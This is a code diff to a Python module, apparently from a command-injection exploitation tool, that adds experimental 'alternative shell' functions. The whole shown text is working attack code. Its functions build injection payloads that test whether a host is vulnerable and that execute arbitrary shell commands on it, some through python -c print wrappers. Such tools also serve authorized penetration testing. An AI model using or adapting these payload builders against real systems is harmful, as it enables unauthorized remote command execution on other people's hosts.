@@ -14,7 +14,9 @@
  For more see the file 'readme/COPYING' for copying permission.
 """
 
+# ----------------------------------------------------------
 # Classic decision payload (check if host is vulnerable).
+# ----------------------------------------------------------
 def decision(separator,TAG, B64_ENC_TAG, B64_DEC_TRICK):
   payload = (separator + 
 	    "echo " + TAG + "" +
@@ -22,7 +24,18 @@ def decision(separator,TAG, B64_ENC_TAG, B64_DEC_TRICK):
 	     ) 
   return payload
 
+"""
+__Warning__: The alternative shells are still experimental.
+"""
+def decision_alter_shell(separator,TAG, B64_ENC_TAG, B64_DEC_TRICK):
+  payload = (separator + 
+	    " python -c \"print '" + TAG + "' + '" + B64_ENC_TAG + "' + '" + B64_DEC_TRICK + "' + '" + TAG + "'\""
+	     ) 
+  return payload
+
+# ---------------------------------------------
 # Execute shell commands on vulnerable host.
+# ---------------------------------------------
 def cmd_execution(separator,TAG,cmd):
   payload = (separator + 
 	    "echo " + TAG + "" +
@@ -31,3 +44,13 @@ def cmd_execution(separator,TAG,cmd):
 	    "$(echo " + TAG + ")" + TAG + ""
 	    )
   return payload
+
+"""
+__Warning__: The alternative shells are still experimental.
+"""
+def cmd_execution_alter_shell(separator,TAG,cmd):
+  payload = (separator + 
+	    " python -c \"print'" + TAG + "'+'" + TAG + "'+'$(echo $("+cmd+"))'+'"+ TAG + "'+'" + TAG + "'\""
+	    )
+  return payload
+
